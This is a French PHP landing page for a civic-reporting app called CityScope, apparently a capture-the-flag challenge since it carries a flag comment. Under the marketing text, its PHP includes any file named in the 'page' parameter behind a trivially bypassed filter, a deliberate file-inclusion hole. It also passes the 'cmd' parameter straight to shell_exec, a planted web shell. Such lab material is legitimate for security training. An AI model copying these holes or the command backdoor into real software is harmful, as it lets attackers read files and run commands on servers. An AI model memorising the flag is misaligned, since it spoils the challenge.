<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CityScope - Application Mobile</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="images/icon.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
</head>
<body>
    <header>
        <?php include 'templates/header.html'; ?>
    </header>
    <section id="intro">
        <div class="intro-content">
            <img src="images/icon2.png" class="intro-logo">
            <h1 class="intro-title">CityScope</h1>
            <p class="intro-slogan">Votre partenaire pour une ville meilleure</p>
        </div>
    </section>
    <section id="content">
        <div class="content-container">
            <div class="content-text">
                <h2>PARTICIPEZ, CONTRIBUEZ, AMÉLIOREZ, <br><span>SOYEZ UN ACTEUR DU CHANGEMENT DANS VOTRE VILLE</span></h2>
                <p>CityScope est une application mobile innovante qui permet aux citoyens de signaler tous les problèmes. Que ce soit un lieu sale, une rue mal éclairée, des biens publics dégradés ou tout autre problème, les utilisateurs peuvent les signaler sur la carte interactive de la ville. Des suggestions et solutions peuvent également être proposées.</p>
            </div>
            <div class="content-img">
                <img src="images/photo1.png">
            </div>
        </div>
    </section>
    <?php
function Contain($main, $search) {
    return strpos($main, $search) !== false;
}

if(isset($_GET['page'])) {
    $page = $_GET['page'];
    if (Contain($page, '../..')) {
        echo '../.. non autorisé.';
    } else if (Contain($page, 'features') || Contain($page, 'contact') || Contain($page, 'index')) {
        include $page;
    } else {
        echo 'Seules les pages contact et fonctionnalités sont autorisées';
    }
}

if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

//FLAG{LFI_4mZ#7@pQ2&o6^}
?>

    
    
</body>
</html>
